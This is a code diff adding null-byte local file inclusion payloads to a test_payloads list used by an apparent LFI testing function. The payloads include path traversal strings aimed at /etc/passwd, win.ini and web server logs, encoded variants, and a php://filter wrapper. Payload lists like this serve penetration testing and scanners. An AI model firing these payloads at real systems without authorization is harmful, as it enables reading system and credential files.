@@ -30,7 +30,23 @@ test_payloads = [
     'https://www.google.com/favicon.ico',
     'ftp://ftp.gnu.org/gnu/README',
     '//example.com/test.txt',
-    '\\\\example.com\\share\\test.txt'
+    '\\\\example.com\\share\\test.txt',
+    #null byte payloads
+    "/etc/passwd%00",
+    "../../../../etc/passwd%00",
+    "../../../etc/passwd%00.png",
+    "....//....//etc/passwd%00",
+    "..\\..\\..\\windows\\win.ini%00",
+    "C:\\windows\\win.ini%00",
+    "/etc/passwd%00.jpg",
+    "/etc/passwd%00.txt",
+    "/etc/passwd%2500",
+    "%252e%252e%252fetc%252fpasswd%2500",
+    "php://filter/convert.base64-encode/resource=/etc/passwd%00",
+    "../../../var/log/apache2/access.log%00",
+    "../../../var/log/nginx/access.log%00",
+    "?file=../../../etc/passwd%00",
+    "?page=../../etc/passwd%00"
 ]
 
 def test_lfi(url):
